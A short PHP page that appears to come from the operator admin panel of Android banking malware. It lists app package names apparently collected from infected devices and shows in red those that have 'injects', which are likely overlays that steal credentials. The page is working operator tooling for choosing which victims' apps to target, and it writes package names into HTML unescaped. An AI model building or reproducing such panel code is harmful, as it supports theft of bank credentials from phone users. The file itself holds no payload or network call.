<?php
	include "config.php";

	print_header();
	
	print_menu();

	$appsInj = get_list_injects();

	$res = $dbm->query("select * from apps");
	$apps = array();
	if($dbm->count>0){
		while($row=mysqli_fetch_array($res)) {
			$aapp = json_decode($row[2]);
			
			for($i=0;$i<count($aapp);$i++){
				$apps[$aapp[$i]->name] = $aapp[$i]->activity;
			}
		}
	
	$html .= "
	<div class=\"table-responsive\">
	<table class=\"table table-sm\" id=\"dataTable\">
	<thead class=\"thead-inverse\">
		<tr>
			<th>PKG</th>
			<th>Info</th>
		</tr>
	</thead>
	";
		
		foreach($apps as $key=>$ap){
			if($appsInj[$key]==1){
				$html .= "<tr><th><a href=\"list.php?op=filter_app&name=".$key."\"><font color=red>".$key . "</font></a></b></th><th>".$ap."</th></tr>";
			}else{
				$html .= "<tr><th><b><a href=\"list.php?op=filter_app&name=".$key."\">".$key . "</a></b></th><th>".$ap."</th></tr>";
			}
		}
	}
	
	$html .="</table></div>";

	print_content("All know apps in admin panel",$html);
	
	print_footer();

?>
